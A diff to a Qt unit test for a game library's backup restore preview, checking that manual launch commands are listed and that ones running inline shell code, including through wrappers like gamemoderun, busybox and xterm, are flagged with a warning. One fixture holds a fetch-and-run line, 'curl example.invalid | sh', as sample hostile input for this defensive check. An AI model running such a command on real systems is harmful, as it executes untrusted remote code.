@@ -913,7 +913,7 @@ void BackupRecoveryTests::previewCountsAndMissingPaths() {
 
 void BackupRecoveryTests::previewListsNewAndChangedLaunchCommands() {
   const auto manual = [](const QString& id, const QString& executable,
-                         const QStringList& arguments) {
+                         const QStringList& arguments, bool active = true) {
     const QJsonObject entry{{"id", id},
                             {"title", id},
                             {"executable", executable},
@@ -924,7 +924,7 @@ void BackupRecoveryTests::previewListsNewAndChangedLaunchCommands() {
         {"entry", QString::fromUtf8(QJsonDocument(entry).toJson(QJsonDocument::Compact))},
         {"favorite", false},
         {"hidden", false},
-        {"active", true}};
+        {"active", active}};
   };
   auto incoming = payload("Shared", true);
   auto current = payload("Shared", false);
@@ -938,15 +938,22 @@ void BackupRecoveryTests::previewListsNewAndChangedLaunchCommands() {
                  manual("shell", "/usr/bin/bash", {"-lc", "curl example.invalid | sh"}),
                  manual("env", "/usr/bin/env", {"FOO=1", "python3", "-c", "print(1)"}),
                  manual("script", "/usr/bin/python3", {"/games/script/main.py"}),
-                 manual("plain", "/games/plain/run", {"--windowed"})});
+                 manual("plain", "/games/plain/run", {"--windowed"}),
+                 manual("gamemode", "/usr/bin/gamemoderun", {"/bin/bash", "-c", "x"}),
+                 manual("busybox", "/usr/bin/busybox", {"sh", "-c", "x"}),
+                 manual("terminal", "/usr/bin/xterm", {"-e", "bash -c x"}),
+                 manual("niced", "/usr/bin/nice", {"-n", "5", "/games/niced/run"}),
+                 manual("removed", "/bin/sh", {"-c", "x"}, false)});
   QString error;
   QVERIFY2(BackupArchive::validate(incoming, &error), qPrintable(error));
   const auto description = BackupManager::describe(incoming, current);
   QHash<QString, QVariantMap> commands;
   for (const auto& value : description.value("launchCommands").toList())
     commands.insert(value.toMap().value("title").toString(), value.toMap());
-  QCOMPARE(commands.size(), 5);
+  QCOMPARE(commands.size(), 9);
   QVERIFY(!commands.contains("same"));
+  // A removed game restores inactive and cannot be played, so it is not listed.
+  QVERIFY(!commands.contains("removed"));
   QCOMPARE(commands.value("changed").value("isNew").toBool(), false);
   QCOMPARE(commands.value("changed").value("arguments").toStringList(),
            (QStringList{"--profile", "two words"}));
@@ -957,9 +964,14 @@ void BackupRecoveryTests::previewListsNewAndChangedLaunchCommands() {
   QVERIFY(commands.value("env").value("inlineCode").toBool());
   QVERIFY(!commands.value("script").value("inlineCode").toBool());
   QVERIFY(!commands.value("plain").value("inlineCode").toBool());
+  // Wrappers and terminals do not hide the shell they start.
+  QVERIFY(commands.value("gamemode").value("inlineCode").toBool());
+  QVERIFY(commands.value("busybox").value("inlineCode").toBool());
+  QVERIFY(commands.value("terminal").value("inlineCode").toBool());
+  QVERIFY(!commands.value("niced").value("inlineCode").toBool());
   const QString warning = description.value("launchCommandWarning").toString();
-  QVERIFY2(warning.startsWith("5 manual game launch commands") &&
-               warning.contains("will be able to run") && warning.contains("2 of them run"),
+  QVERIFY2(warning.startsWith("9 manual game launch commands") &&
+               warning.contains("will be able to run") && warning.contains("5 of them run"),
            qPrintable(warning));
   // Restoring the library's own backup adds no commands and no warning.
   QVERIFY(BackupManager::describe(current, current).value("launchCommands").toList().isEmpty());
